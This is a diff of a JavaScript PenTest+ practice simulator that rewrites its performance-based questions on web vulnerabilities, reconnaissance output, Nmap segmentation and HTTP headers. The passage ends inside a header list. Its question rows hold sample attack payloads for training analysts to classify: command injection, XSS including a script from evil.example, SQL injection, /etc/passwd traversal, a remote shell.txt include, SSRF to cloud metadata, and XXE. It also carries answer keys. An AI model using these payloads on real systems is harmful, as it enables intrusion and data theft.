-const VULN = ["Command Injection","DOM-based Cross Site Scripting","SQL Injection (Error)","SQL Injection (Stacked)","SQL Injection (Union)","Reflected Cross Site Scripting","Local File Inclusion","Remote File Inclusion","URL Redirect"];
-const REMED = ["Parametrized queries","Preventing external calls","Input Sanitization .. , \\ , / , sandbox requests","Input Sanitization ‘ , : , $ , { , } ( , ),","Input Sanitization “ , ; , < , : , > , -,"];
-
-const SOURCE_LINES = [
-  '<html>','<head>','<title>Secure Login </title>','</head>','<body>','<meta',
-  'content="c2RmZGZnaHNzZmtqbGdoc2Rma2pnaGRzZmpoZGZvaWZaGRmc29pYmp3ZXIndWldm9pb2hz… (long base64 string)" name="csrftoken"/>',
-  '<select><scr' + 'ipt>',
-  'document.write("<OPTION value=\'1\'>"+document.location.href.substring(document.location.href.indexOf("t=")+16)+"</OPTION>");',
-  '<\/script></select>',
-  '<div align="center">',
-  '<form action="c2url value="main.do" method="post">',
-  '<div style="margin-top:20px;margin-bottom:10px;">',
-  '<span style="width:500px;color:blue;font-size:30px;font-weight:bold;border-bottom:1 px solid blue;">Company Secure System Login</span>',
-  '</div>',
-  '<div style="margin-bottom:5px;">',
-  '<span style="width:100px;">Name</span>',
-  '<input style="width:150px;" type="text" name="name" id="name" value="">',
-  '<li- <input style="width:150px;" type="text" name="name" id="name" value="">',
-  '</div>',
-  '<div><span style="width:100px;">Password: </span><input style="width:150px;" type="password" name="Password" id="password" value="">',
-  '<!-' + '-div><scan style="width:100px;">Password: </span><input style="width:150px;" type="password" name="Password" id="password" value="password" -' + '->'
+/* ============================================================
+   PenTest+ PBQs — original content (PT0-003 skills)
+   Recognition / analysis / remediation style (no attack playbooks)
+============================================================ */
+const VULN = [
+  "OS command injection", "Reflected XSS", "Stored XSS", "SQL injection (boolean-based blind)",
+  "SQL injection (UNION-based)", "Path traversal", "Server-side request forgery (SSRF)",
+  "XML external entity (XXE)", "Server-side template injection (SSTI)", "LDAP injection"
+];
+const REMED = [
+  "Parameterized queries / prepared statements",
+  "Context-aware output encoding and a Content Security Policy",
+  "Avoid shell calls; use safe APIs with allow-listed arguments",
+  "Canonicalize paths and allow-list permitted file names",
+  "Allow-list outbound destinations; block internal and metadata addresses",
+  "Disable DTDs and external entity resolution in the XML parser",
+  "Never render user input as template code; use logic-less templates",
+  "Escape LDAP filter special characters ( * ( ) \\ NUL )"
 ];
 
-const COOKIES = [
-  ["ASP.NET_SessionId","h1bcdctse2ewwqwf4bdcby3v6315408269693.1508266963.1","www.com…","/","Session","41"],
-  ["__utma","36104370.911011372.150826696963.1508266963.1508266963.1",".company.o…","/","2019-10-1…","59"],
-  ["__utmb","36104370.7.9.1508267968443",".company.o…","/","2017-10-1…","32"],
-  ["__utmc","36104370",".company.o…","/","Session","14"],
-  ["__utmt","1",".company.o…","/","2017-10-1…","7"],
-  ["__utmv","36104370.|2=Account%20Type=Not%20Defined=1",".company.o…","/","2019-10-1…","48"],
-  ["__utmz","36104370.1508266963.1.1.utmcsr=google|utmccn=(organic)|utmc…",".company.o…","/","2018-04-1…","99"],
-  ["_sp_id.0767","4a84866c6fff5f1c.1508266964.1 1508258019.1508266964.81ff3477…",".company.o…","/","2019-10-1…","99"],
-  ["_sp_ses.0767","*",".company.o…","/","2017-10-1…","13"]
-];
-
-const questions = [
-  /* ---------------- Q1: table PBQ ---------------- */
+let questions = [
+  /* ---------------- PBQ 1: payload table ---------------- */
   {
     type: "table",
     kind: "Performance-based question",
-    title: "Hardening a web server: HTTP request payloads",
+    title: "Web app assessment: classify the findings",
     scenario: [
-      "You are a security analyst responsible for hardening a web server. You have been provided with a list of HTTP payloads identified as potentially malicious.",
-      "<strong>Instructions:</strong> For each attack signature, identify the type of attack and determine the appropriate remediation to prevent similar attacks in the future.",
-      "To restore the simulation to its original state at any time, click the <strong>Reset All</strong> button."
+      "During an authorized web application test of <code>portal.acmefreight.example</code>, your proxy captured the requests below. Each one produced evidence of a vulnerability.",
+      "<strong>Instructions:</strong> For each request, select the vulnerability type and the remediation you will recommend in the report.",
+      "To restore the simulation to its original state at any time, click the <strong>Reset</strong> button."
     ],
-    caption: "HTTP Request Payload Table",
+    caption: "Captured requests",
     vulnOptions: VULN, remedOptions: REMED,
     rows: [
-      { payload: "lookup=$(whoami)", vuln: "Command Injection", remed: REMED[3],
-        why: "$( ) is shell command substitution, so user input is being passed to an OS command. Sanitize shell metacharacters such as ' : $ { } ( )." },
-      { payload: "search=Bob”%3e%3cimg%20src3da%20onerror%3dalert(1)%3e", vuln: "Reflected Cross Site Scripting", remed: REMED[4],
-        why: "URL-encoded \"><img onerror=alert(1)> breaks out of an attribute and runs script. The parameter is echoed straight back in the response, which makes it reflected XSS. Sanitize \" ; < : > -." },
-      { payload: "logfile=%2fetc%2fpasswd%00", vuln: "Local File Inclusion", remed: REMED[2],
-        why: "Requesting /etc/passwd (with a null byte to truncate any appended extension) reads a file already on the server. Sanitize .. \\ / and sandbox file requests." },
-      { payload: "#inner-tab”><scr" + "ipt>alert(1)<\/scr" + "ipt>", vuln: "DOM-based Cross Site Scripting", remed: REMED[4],
-        why: "The payload sits in the URL fragment (#), which is processed client-side by JavaScript and never sent to the server. That is the hallmark of DOM-based XSS." },
-      { payload: "site=www.exa‘ping%20-c%2010%20localhost‘mple.com", vuln: "Command Injection", remed: REMED[3],
-        why: "Backticks run the enclosed text (ping -c 10 localhost) as a command. Sanitize backticks, quotes, $, braces and parentheses." },
-      { payload: "redir=http:%2f%2fwww.malicious-site.com", vuln: "URL Redirect", remed: REMED[1],
-        why: "A redirect parameter pointing to an attacker-controlled domain is an open URL redirect. Block the application from sending users to external destinations." },
-      { payload: "item=widget’;waitfor%20delay20’00:00:20’;--", vuln: "SQL Injection (Stacked)", remed: REMED[0],
-        why: "The semicolon ends the original query and starts a second one (WAITFOR DELAY). Running multiple statements in one request is stacked SQLi. Parametrized queries prevent it." },
-      { payload: "item=widget%20union%20select%20null,null,@@version;--", vuln: "SQL Injection (Union)", remed: REMED[0],
-        why: "UNION SELECT appends the attacker's query results to the original result set. NULL columns are used to match the column count." },
-      { payload: "item=widget’+convert(int,@@version)+’", vuln: "SQL Injection (Error)", remed: REMED[0],
-        why: "Converting a text value (@@version) to an integer forces a database error that leaks the version string in the error message. That is error-based SQLi." },
-      { payload: "logFile-http:%2f%2fww.malicious-site.com%2fshell.txt", vuln: "Remote File Inclusion", remed: REMED[1],
-        why: "The parameter loads a file from an external URL (shell.txt). Pulling in remote content to execute is remote file inclusion. Preventing external calls stops it." }
+      { payload: "GET /tools/ping?host=127.0.0.1;id", vuln: "OS command injection", remed: REMED[2],
+        why: "A shell metacharacter (;) after the host value lets a second command run, so user input is reaching a shell. Don't build shell strings from input; call the function directly or allow-list arguments." },
+      { payload: "GET /search?q=<svg/onload=alert(1)>   (echoed in the results page)", vuln: "Reflected XSS", remed: REMED[1],
+        why: "The input is reflected straight back in the response for that one request, which makes it reflected XSS. Encode output for its HTML context and add a CSP." },
+      { payload: "POST /blog/42/comments   comment=<script src=//evil.example/k.js><\/script>   (shown to every visitor)", vuln: "Stored XSS", remed: REMED[1],
+        why: "The script is saved by the application and served to everyone who views the post, so it is stored (persistent) XSS. Same fix: encode output and use a CSP." },
+      { payload: "GET /item?id=7' AND 1=1-- -   vs   id=7' AND 1=2-- -   (page differs, no data shown)", vuln: "SQL injection (boolean-based blind)", remed: REMED[0],
+        why: "No data is returned, but the page behaves differently for a true vs a false condition. That true/false oracle is boolean-based blind SQLi. Parameterized queries stop it." },
+      { payload: "GET /item?id=-1 UNION SELECT username,email FROM users-- -", vuln: "SQL injection (UNION-based)", remed: REMED[0],
+        why: "UNION SELECT appends the attacker's query results to the page's own result set. Parameterized queries stop it." },
+      { payload: "GET /download?file=..%2f..%2f..%2f..%2fetc%2fpasswd", vuln: "Path traversal", remed: REMED[3],
+        why: "Encoded ../ sequences climb out of the download folder to read an arbitrary file. Canonicalize the path, confirm it stays inside the allowed folder, and allow-list file names." },
+      { payload: "POST /api/preview   url=http://169.254.169.254/latest/meta-data/", vuln: "Server-side request forgery (SSRF)", remed: REMED[4],
+        why: "The server fetches a URL the attacker supplied, here the cloud metadata service, which can leak temporary cloud credentials. Allow-list destinations, block internal and metadata ranges, and require IMDSv2." },
+      { payload: "POST /api/import   <!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/hostname\">]><r>&x;</r>", vuln: "XML external entity (XXE)", remed: REMED[5],
+        why: "A DOCTYPE declares an external entity pointing to a local file, and the parser expands it into the response. Disable DTDs and external entities in the parser." },
+      { payload: "GET /greet?name={{7*7}}   (response: Hello 49)", vuln: "Server-side template injection (SSTI)", remed: REMED[6],
+        why: "The template engine evaluated 7*7, which proves user input is being run as template code. Pass input to templates as data only." },
+      { payload: "POST /login   user=*)(uid=*))(|(uid=*", vuln: "LDAP injection", remed: REMED[7],
+        why: "Parentheses and wildcards rewrite the LDAP search filter so it matches any user. Escape LDAP special characters or use a safe filter builder." }
     ]
   },
 
-  /* ---------------- Q2: drag and drop ---------------- */
+  /* ---------------- PBQ 2: match tool to recon goal ---------------- */
   {
-    type: "dnd",
-    kind: "Drag and drop",
-    title: "Penetration test: certificate, source code or cookies?",
+    type: "match",
+    kind: "Performance-based question",
+    title: "Reconnaissance: match the tool to the task",
     scenario: [
-      "You are a penetration tester reviewing a client's website using a web browser.",
-      "<strong>Instructions:</strong> Examine all website components in the browser to identify potential vulnerabilities. Determine which component (certificate, source code, or cookies) contains the highest-severity vulnerability, and remediate <em>only</em> that vulnerability.",
-      "To restore the simulation to its original state at any time, click the <strong>Reset All</strong> button."
+      "You are in the reconnaissance and enumeration phase of an external engagement against <code>acmefreight.example</code>. The scope is passive and active information gathering of public-facing assets.",
+      "<strong>Instructions:</strong> For each task, select the single most appropriate tool.",
+      "To restore the simulation to its original state at any time, click the <strong>Reset</strong> button."
     ],
-    vuln: {
-      prompt: "Which component contains the highest-severity vulnerability?",
-      options: ["Certificate", "Source code", "Cookies"],
-      answer: "Certificate"
-    },
-    options: [
-      { id: "remove",  text: "Remove certificate from server" },
-      { id: "csr",     text: "Generate a Certificate Signing Request" },
-      { id: "submit",  text: "Submit CSR to the CA" },
-      { id: "install", text: "Install re-issued certificate on the server" }
-    ],
-    /* first entry is the primary key; others are also accepted */
-    orders: [
-      ["csr", "submit", "remove", "install"],
-      ["remove", "csr", "submit", "install"]
-    ],
-    explain: `
-      <h3>What each component shows</h3>
-      <ul>
-        <li><strong>Certificate (highest severity, remediate this):</strong> the wildcard certificate for *.Company.org was valid from 7/18/2016 to 7/19/2018, so it is expired. Browsers can no longer trust it, users are trained to click through warnings, and the identity and encryption guarantees for the login page (and everything else on the domain) are gone.</li>
-        <li><strong>Source code (report, but not the answer here):</strong> a commented-out password field with a hard-coded value, and a <code>document.write</code> that writes <code>location.href</code> into the page (DOM-based XSS risk).</li>
-        <li><strong>Cookies (report, but not the answer here):</strong> none of the cookies, including the ASP.NET session ID, have HttpOnly, Secure or SameSite set.</li>
-      </ul>
-      <h3>Remediation order</h3>
-      <p>Generate a CSR (new key pair), submit it to the CA, remove the expired certificate from the server, then install the re-issued certificate. Some answer keys put "remove" before generating the CSR, so this simulator accepts either placement as long as the CSR is generated before it is submitted and the re-issued certificate is installed last.</p>`
+    options: ["theHarvester", "dig", "whois", "Nmap", "Shodan", "WPScan", "Nikto", "Amass", "Censys"],
+    rows: [
+      { task: "Gather employee email addresses and subdomains from public search engines, without touching the target (OSINT).", answer: "theHarvester",
+        why: "theHarvester collects emails, names, subdomains and hosts from public sources. It is passive OSINT, so nothing is sent to the target." },
+      { task: "Resolve a host's A, MX and TXT records from a specific DNS server.", answer: "dig",
+        why: "dig queries DNS records directly and lets you point at a chosen resolver with @server." },
+      { task: "Find the registrar, registration date and abuse contact for the domain.", answer: "whois",
+        why: "whois returns domain and IP registration records: registrar, dates and contacts." },
+      { task: "Enumerate open ports, services and versions on the discovered hosts.", answer: "Nmap",
+        why: "Nmap is the standard port and service scanner, including version and script scanning." },
+      { task: "Discover internet-exposed devices and banners for the target's IP ranges without scanning them yourself.", answer: "Shodan",
+        why: "Shodan indexes internet-facing hosts and banners that others have already scanned, so you learn exposure passively." },
+      { task: "Enumerate plugins, themes and users on a site you've confirmed runs WordPress.", answer: "WPScan",
+        why: "WPScan is the WordPress-specific scanner for core, plugin, theme and user enumeration." },
+      { task: "Check a web server for thousands of known dangerous files, outdated software and misconfigurations.", answer: "Nikto",
+        why: "Nikto is a web server scanner that tests for known risky files, default content and server misconfigurations." },
+      { task: "Build a large map of subdomains by combining passive sources with DNS brute forcing.", answer: "Amass",
+        why: "Amass specializes in in-depth subdomain discovery, mixing many passive data sources with active DNS enumeration." }
+    ]
   },
 
-  /* ---------------- Q3: multi-part output analysis ---------------- */
+  /* ---------------- PBQ 3: multi-output recon analysis ---------------- */
   {
     type: "multi",
-    kind: "Simulation",
-    title: "Reconnaissance: TheHarvester, DNS and WHOIS output",
+    kind: "Performance-based question",
+    title: "Reconnaissance: reading tool output",
     scenario: [
-      "A penetration tester has been provided with only the public domain name and must enumerate additional information for the public-facing assets.",
-      "<strong>Instructions:</strong> Select the appropriate answer(s), given the output from each section."
+      "You were given only the domain <code>acmefreight.example</code> and asked to enumerate public assets. The tabs below show the output you collected.",
+      "<strong>Instructions:</strong> Review each output tab and answer its findings."
     ],
     outputs: [
       { label: "Output 1", text: [
-        "[*] Target: someclouddomain.org","","Searching 0 results.","Searching 100 results.","Searching 200 results.","[*] Searching Google.","",
-        "[*] No IPs found.","","[*] Emails found: 9","----------------------",
-        "afrihari@someclouddomain.org","security@someclouddomain.org","info@someclouddomain.org","gfareau@someclouddomain.org","avapretta@someclouddomain.org","lastname@someclouddomain.org","researchIT@someclouddomain.org","ghstrowski@someclouddomain.org","conferencespeakers@someclouddomain.org","",
-        "[*] Hosts found: 9","---------------------",
-        "academic-stores.someclouddomain.org:34.196.18.124, 34.233.45.248,","52.7.213.114, 54.174.10.37",
-        "certifications.someclouddomain.org:198.134.5.32","connection.someclouddomain.org:13.107.246.51, 13.107.213.51","logins.someclouddomain.org:198.134.5.46","your.someclouddomain.org:52.173.139.125","ITpartners.someclouddomain.org:104.43.140.101","ls.someclouddomain.org:67.199.248.13, 67.199.248.12",
-        "stores.someclouddomain.org:34.233.45.248, 52.7.213.114, 54.174.10.37,","34.196.18.124","www.someclouddomain.org:23.96.239.26"
+        "[*] Target: acmefreight.example","[*] Searching public sources...","",
+        "[*] Emails found: 5","----------------------",
+        "j.ortega@acmefreight.example","payroll@acmefreight.example","it-help@acmefreight.example","careers@acmefreight.example","s.webb@acmefreight.example","",
+        "[*] Hosts found: 6","---------------------",
+        "www.acmefreight.example:203.0.113.20","vpn.acmefreight.example:203.0.113.44","mail.acmefreight.example:203.0.113.25",
+        "dev.acmefreight.example:10.10.5.12","tracking.acmefreight.example:198.51.100.7","owa.acmefreight.example:203.0.113.25"
       ].join("\n") },
       { label: "Output 2", text: [
-        "nslookup Output","Server:  Unknown","Address: 8.8.8.8","","Non-Authoritative answer:","Name:   someclouddomain.org","Addresses:","245.62.183.182","245.145.184.203","",
-        "dig Output","; DiG 9.11.5-P4.testmachine-Ubuntu <<>> someclouddomain.org",";; global options: +cmd",
-        "someclouddomain.org.    300  IN  A  245.62.183.182","someclouddomain.org.    300  IN  A  245.145.184.203"
+        "; <<>> DiG 9.18 <<>> acmefreight.example ANY","",
+        "acmefreight.example.    300  IN  A    203.0.113.20",
+        "acmefreight.example.    300  IN  MX   10 mail.acmefreight.example.",
+        "acmefreight.example.    300  IN  TXT  \"v=spf1 include:_spf.acmefreight.example -all\"",
+        "acmefreight.example.    300  IN  NS   ns1.acmefreight.example.",
+        "_dmarc.acmefreight.example. 300 IN TXT \"v=DMARC1; p=none; rua=mailto:dmarc@acmefreight.example\""
       ].join("\n") },
       { label: "Output 3", text: [
-        "(command 1)","whois 245.62.183.203","","NetRange: 245.62.0.0 - 245.62.255.255","CIDR: 245.62.0.0/16","NetName: Amazon-05","NetHandle: NET-245-62-0-0-1","Parent: NET245 (NET 245-0-0-0-0)","NetType: Direct Allocation","OriginAS: AS56466, AS66522, AS7226","Organization:  Amazon.com, Inc. (AMAZON)","RegDate 2010-08-27","Updated: 2015-09-24","Ref: https://rdap.arin.net/registry/ip/245.62.183.203","",
-        "(command 2)","whois someclouddomain.org","","Domain Name: someclouddomain.org","Registry Domain ID: D20033912-LRJA","Updated Date: 2021-02-15T04:43:38Z","Creation Date: 1993-09-22T04:00:38Z","Registrar: LocalComputerPro's, Inc.","Registrar Abuse Contact Email: domainabuse@localcomputerpros.com","Registrar Abuse Contact Phone: 1234567789","Registry Expiry Date: 2021-08-14T04:00:00Z"
+        "whois acmefreight.example","",
+        "Domain Name: acmefreight.example","Registrar: Example Registrar, LLC","Creation Date: 2008-03-11T09:14:00Z",
+        "Registry Expiry Date: 2026-03-11T09:14:00Z","Registrant Organization: Acme Freight Co.",
+        "Name Server: ns1.acmefreight.example","Name Server: ns2.acmefreight.example","",
+        "whois 203.0.113.44","NetName: ACME-CLOUD-DC1","Organization: CloudHost Inc.","NetRange: 203.0.113.0 - 203.0.113.255"
       ].join("\n") }
     ],
     blocks: [
-      { output: 0, kind: "radio", header: "Which of the following tools created this output? <small>(Output 1)</small>",
-        options: ["WHOIS", "dig", "Nmap", "TheHarvester"], answer: "TheHarvester",
-        why: "TheHarvester is an OSINT tool: the banner shows a target, a search source (Google) and then the emails and hosts it found. WHOIS returns registration records, dig queries DNS, and Nmap scans ports." },
-      { output: 0, kind: "radio", mono: true, header: "Select the appropriate command to produce the output:",
-        options: ["theharvester -d someclouddomain.org -l 200 -b google.com", "theharvester -d google.com -l 200 -b someclouddomain.org"],
-        answer: "theharvester -d someclouddomain.org -l 200 -b google.com",
-        why: "-d is the target domain, -l limits the number of results (the output searched up to 200) and -b is the data source (Google). The other option swaps the domain and the source." },
-      { output: 1, kind: "checks", mono: true, header: "Review Output 2 for the <code>nslookup</code> and <code>dig</code> commands:",
-        context: "Use the provided public DNS server to find the appropriate IPs for someclouddomain.org.<br>The local DNS server does not have Internet access.<br><br>Your Domain: pentestdomain.com<br>Your IP Address: 10.97.55.62<br>Public DNS Server: 8.8.8.8<br>Private DNS Server: 192.168.20.66<br>Target Domain: someclouddomain.org",
-        prompt: "Select TWO commands that would produce the <code>nslookup</code> and <code>dig</code> output:",
-        options: [
-          "$ dig @8.8.8.8 +noall +answer someclouddomain.org",
-          "$ dig @192.168.20.66 someclouddomain.org +short",
-          "$ dig someclouddomain.org +noall +short",
-          "> nslookup someclouddomain.org 8.8.8.8",
-          "> nslookup someclouddomain.org 192.168.20.66",
-          "> nslookup someclouddomain.org"
-        ],
-        answers: ["$ dig @8.8.8.8 +noall +answer someclouddomain.org", "> nslookup someclouddomain.org 8.8.8.8"],
-        why: "The local DNS server (192.168.20.66) has no Internet access, so both tools must be pointed at the public server 8.8.8.8 (the nslookup output even shows Address: 8.8.8.8). dig's @server syntax does that, and nslookup takes the server as its last argument. The dig output also shows the full answer records (TTL 300, IN, A), which +short would not print." },
-      { output: 2, kind: "dropdowns", header: "Review Output 3. Select the appropriate option for each dropdown",
+      { output: 0, kind: "radio", header: "Which host in Output 1 was most likely leaked unintentionally and is out of normal external scope? <small>(Output 1)</small>",
+        options: ["www.acmefreight.example", "vpn.acmefreight.example", "dev.acmefreight.example (10.10.5.12)", "mail.acmefreight.example"],
+        answer: "dev.acmefreight.example (10.10.5.12)",
+        why: "dev.acmefreight.example resolves to an RFC 1918 private address (10.10.5.12). An internal dev host showing up in public DNS is an information leak and would normally be out of external scope, so confirm it in the rules of engagement before touching it." },
+      { output: 0, kind: "checks", header: "Review Output 1.",
+        prompt: "Select the TWO assets most useful for building a password-spray target list for a later, in-scope phase:",
+        options: ["The list of employee email addresses", "vpn.acmefreight.example", "The TTL values", "careers@acmefreight.example only", "tracking.acmefreight.example"],
+        answers: ["The list of employee email addresses", "vpn.acmefreight.example"],
+        why: "Harvested emails reveal the username format, and an internet-facing VPN portal is a common authentication surface. Together they're what a spray would target (only if the ROE allows it). TTLs are irrelevant, and the careers mailbox alone isn't a user list." },
+      { output: 1, kind: "radio", header: "Based on the DMARC record in Output 2, what is the email-security weakness?",
+        options: ["SPF is missing", "DMARC policy is p=none, so spoofed mail is only monitored, not rejected", "The MX record points to the wrong host", "DNSSEC is disabled"],
+        answer: "DMARC policy is p=none, so spoofed mail is only monitored, not rejected",
+        why: "SPF is present and set to -all, but DMARC p=none means failing mail is still delivered. That makes the domain easier to spoof for phishing. Recommend moving to p=quarantine or p=reject after monitoring." },
+      { output: 2, kind: "dropdowns", header: "Review Output 3. Select the appropriate option for each dropdown.",
         items: [
-          { prompt: "Where is the domain being hosted?", options: ["Someclouddomain", "ARIN", "LocalComputerPro's.com", "Amazon"], answer: "Amazon",
-            why: "The IP whois lists Amazon.com, Inc. as the organization that owns the address block. ARIN is only the registry that holds the record." },
-          { prompt: "Who registered the domain?", options: ["LocalComputerPro's, Inc.", "ARIN", "Someclouddomain", "Amazon"], answer: "LocalComputerPro's, Inc.",
-            why: "The domain whois lists LocalComputerPro's, Inc. as the Registrar." },
-          { prompt: "When was the domain registered?", options: ["1993-09-22T04:00:38Z", "2021-02-15T04:43:38Z", "2015-09-24", "2010-08-27"], answer: "1993-09-22T04:00:38Z",
-            why: "The domain's Creation Date is 1993-09-22. The 2021 value is the last update, and the 2010 and 2015 dates belong to the IP block record." }
+          { prompt: "Who operates the IP address behind vpn.acmefreight.example?", options: ["Acme Freight Co.", "Example Registrar, LLC", "CloudHost Inc.", "ns1.acmefreight.example"], answer: "CloudHost Inc.",
+            why: "The IP whois lists CloudHost Inc. as the organization for the 203.0.113.0/24 block, so the VPN is hosted at a cloud provider, not on-premises." },
+          { prompt: "When was the domain first registered?", options: ["2008-03-11", "2026-03-11", "2024", "ns2.acmefreight.example"], answer: "2008-03-11",
+            why: "The Creation Date is 2008-03-11. The 2026 date is the expiry." }
         ] }
     ]
   },
 
-  /* ---------------- Q4: network diagram + Nmap simulation ---------------- */
+  /* ---------------- PBQ 4: network diagram + Nmap (segmentation) ---------------- */
   {
     type: "sim",
-    kind: "Simulation",
-    title: "Nmap results: WAF, app server and DB server",
+    kind: "Performance-based question",
+    title: "Nmap results: is the segmentation holding?",
     scenario: [
-      "A penetration tester performs several Nmap scans against the web application for a client.",
-      "<strong>Instructions:</strong> Click on the WAF and servers to review the results of the Nmap scans. Then click on each tab to select the appropriate vulnerability and remediation options.",
-      "If at any time you would like to bring back the initial state of the simulation, please click the <strong>Reset All</strong> button."
+      "As part of a PCI-style internal test, you scanned from the <strong>corporate user VLAN</strong> toward the cardholder data environment (CDE). The design says users should reach the jump host only, and the jump host should reach the database.",
+      "<strong>Instructions:</strong> Click the jump host and the database server to review each scan, then choose the finding and the two best remediations.",
+      "If at any time you would like to bring back the initial state of the simulation, please click the <strong>Reset</strong> button."
     ],
     nodes: {
-      cdn: { title: "CDN/WAF", name: "CDN/WAF", host: "CDN.example.com", icon: "fw", zone: "cdn",
-        text: "Nmap scan report for 205.3.45.68\nHost is up (0.016s latency).\nPORT      STATE     SERVICE    VERSION\n80/tcp    open      http       nginx\n443/tcp   open      ssl/https  nginx\n3306/tcp  filtered  mysql" },
-      app: { title: "App server", name: "App server", host: "App01.example.com", icon: "srv", zone: "prod",
-        text: "Nmap scan report for 103.2.45.51\nHost is up (0.341s latency).\nPORT      STATE     SERVICE    VERSION\n80/tcp    open      http       nginx 1.18.0\n443/tcp   open      ssl/http   nginx 1.18.0\n3306/tcp  filtered  mysql" },
-      db: { title: "DB server", name: "DB server", host: "DBProd.example.com", icon: "srv", zone: "prod",
-        text: "Nmap scan report for 103.1.45.50\nHost is up (0.046s latency).\nPORT      STATE     SERVICE    VERSION\n80/tcp    filtered  http\n443/tcp   filtered  ssl/http\n3306/tcp  filtered  mysql" }
+      jump: { title: "Jump host", name: "Jump host", host: "jump01 (10.50.1.10)", icon: "srv", zone: "cdn",
+        text: "Nmap scan from 10.40.8.33 (user VLAN)\nNmap scan report for 10.50.1.10\nHost is up (0.002s latency).\nPORT     STATE  SERVICE\n22/tcp   open   ssh\n3389/tcp open   ms-wbt-server" },
+      db: { title: "Database server", name: "Database server", host: "cde-db01 (10.50.2.20)", icon: "srv", zone: "prod",
+        text: "Nmap scan from 10.40.8.33 (user VLAN)\nNmap scan report for 10.50.2.20\nHost is up (0.003s latency).\nPORT     STATE  SERVICE\n1433/tcp open   ms-sql-s\n3389/tcp open   ms-wbt-server" }
     },
     vuln: {
-      prompt: "Based on the output text, select the <strong>most</strong> likely vulnerability:",
+      prompt: "Based on the scans, select the <strong>most</strong> accurate finding:",
       options: [
-        "Bypass the WAF to communicate directly with App01.example.com.",
-        "Execute a SQL injection attack against DBProd.example.com.",
-        "Perform a SSRF attack against App01.example.com from CDN.example.com.",
-        "Exploit a privilege escalation attack on App01.example.com."
+        "The database is unreachable from the user VLAN, so segmentation is effective.",
+        "The user VLAN can reach the CDE database directly on 1433/tcp, so segmentation is not enforced.",
+        "The jump host is running an outdated SSH version.",
+        "The database is vulnerable to SQL injection."
       ],
-      answer: "Perform a SSRF attack against App01.example.com from CDN.example.com."
+      answer: "The user VLAN can reach the CDE database directly on 1433/tcp, so segmentation is not enforced."
     },
     rem: {
-      prompt: "Select the two <strong>best</strong> remediation options:",
+      prompt: "Select the TWO <strong>best</strong> remediations:",
       options: [
-        "Restrict direct communications to App01.example.com to only approved components.",
-        "Require an additional authentication header value between CDN.example.com and App01.example.com.",
-        "Throttle the number of concurrent connections to CDN.example.com.",
-        "Change the default port used for the MySQL Database Connection to DBProd.example.com.",
-        "Change the default ports used for the web server on App01.example.com.",
-        "Configure a host-based intrusion detection system on App01.example.com."
+        "Add firewall/ACL rules so only the jump host can reach cde-db01, and deny the user VLAN.",
+        "Restrict RDP and SQL on cde-db01 to the jump host's address only.",
+        "Change the SQL Server port from 1433 to a non-standard port.",
+        "Ask users not to connect to the database.",
+        "Install antivirus on the database server.",
+        "Shorten the DHCP lease on the user VLAN."
       ],
       answers: [
-        "Restrict direct communications to App01.example.com to only approved components.",
-        "Require an additional authentication header value between CDN.example.com and App01.example.com."
+        "Add firewall/ACL rules so only the jump host can reach cde-db01, and deny the user VLAN.",
+        "Restrict RDP and SQL on cde-db01 to the jump host's address only."
       ]
     },
     explain: `
       <h3>Reading the scans</h3>
       <ul>
-        <li><strong>CDN/WAF and App01</strong> both expose 80 and 443 (nginx), so the web tier is reachable and App01 sits behind the CDN/WAF as a trusted back end.</li>
-        <li><strong>DBProd</strong> shows every port as filtered, so it can't be attacked directly from outside. That rules out SQL injection against DBProd as the most likely finding.</li>
-        <li>Nothing in the output points to a local foothold on App01, which rules out privilege escalation.</li>
-        <li>The answer key for this question is the SSRF option: the CDN/WAF is the component that makes requests to App01, so forged requests relayed through it are the likely abuse path.</li>
+        <li>The scan was run <strong>from the user VLAN</strong>. It shows <code>cde-db01</code> answering on <code>1433/tcp</code> (SQL) and <code>3389/tcp</code> (RDP), so a normal user segment can talk straight to the database.</li>
+        <li>The design intends users to reach only the jump host, and only the jump host to reach the database. The database being reachable from the user VLAN means the <strong>segmentation control has failed</strong>.</li>
+        <li>Nothing in the output shows an SSH version or any SQL injection, so those options aren't supported by the evidence.</li>
       </ul>
       <h3>Remediation</h3>
       <ul>
-        <li><strong>Restrict direct communications to App01</strong> to approved components (for example, allow-list only the CDN/WAF addresses).</li>
-        <li><strong>Require an authentication header</strong> between the CDN and App01, so App01 rejects any request that did not come through the WAF.</li>
-        <li>The other options don't fix the root cause: throttling only limits volume, changing default ports is security through obscurity, and a host-based IDS detects rather than prevents.</li>
+        <li><strong>Enforce the segmentation at the network layer:</strong> firewall or ACL rules that permit only the jump host to reach <code>cde-db01</code> and deny the user VLAN.</li>
+        <li><strong>Lock the services to the jump host:</strong> host firewall rules so RDP and SQL on the database accept connections only from the jump host's IP.</li>
+        <li>Changing the port is security through obscurity, antivirus doesn't address reachability, and "ask users not to connect" is not a control.</li>
       </ul>`
   },
 
-  /* ---------------- Q5: hotspot (robots.txt) ---------------- */
+  /* ---------------- PBQ 5: HTTP response header hotspot ---------------- */
   {
     type: "hotspot",
-    kind: "Hotspot",
-    title: "Reconnaissance: robots.txt review",
+    kind: "Performance-based question",
+    title: "Review the HTTP response headers",
     scenario: [
-      "A penetration tester is performing reconnaissance for a web application assessment. Upon investigation, the tester reviews the robots.txt file for items of interest.",
-      "<strong>Instructions:</strong> Select the tool the penetration tester should use for further investigation. Select the three entries in the robots.txt file that the penetration tester should recommend for removal.",
-      "If at any time you would like to bring back the initial state of the simulation, please click the <strong>Reset All</strong> button."
+      "While testing <code>https://shop.acmefreight.example</code>, you captured the server's response headers for the authenticated area.",
+      "<strong>Instructions:</strong> Select the three header issues you should report, and choose the single highest-priority fix.",
+      "If at any time you would like to bring back the initial state of the simulation, please click the <strong>Reset</strong> button."
     ],
-    url: "http://example.com/robots.txt",
-    listPrompt: "Select the three robots.txt entries the penetration tester should recommend for removal:",
+    url: "HTTP/1.1 200 OK  —  response headers",
+    listPrompt: "Select the THREE header findings you should report:",
     lines: [
-      "User-agent: *", "Disallow: /search", "Disallow: /search/about", "User-agent: acunetix", "crawl-delay: 10",
-      "Disallow: /search/static", "User-agent: Baidu", "crawl-delay: 12", "User-agent: Slurp", "crawl-delay: 20",
-      "Disallow: /sdch", "User-agent: Comptia", "Disallow: /admin", "Disallow: /wp-admin", "crawl-delay: 15",
-      "Disallow: /groups", "Disallow: /?hl=", "Disallow: /wp-login.php"
+      "HTTP/1.1 200 OK",
+      "Date: Sat, 21 Nov 2026 15:00:00 GMT",
+      "Server: Apache/2.4.29 (Ubuntu) PHP/7.2.3",
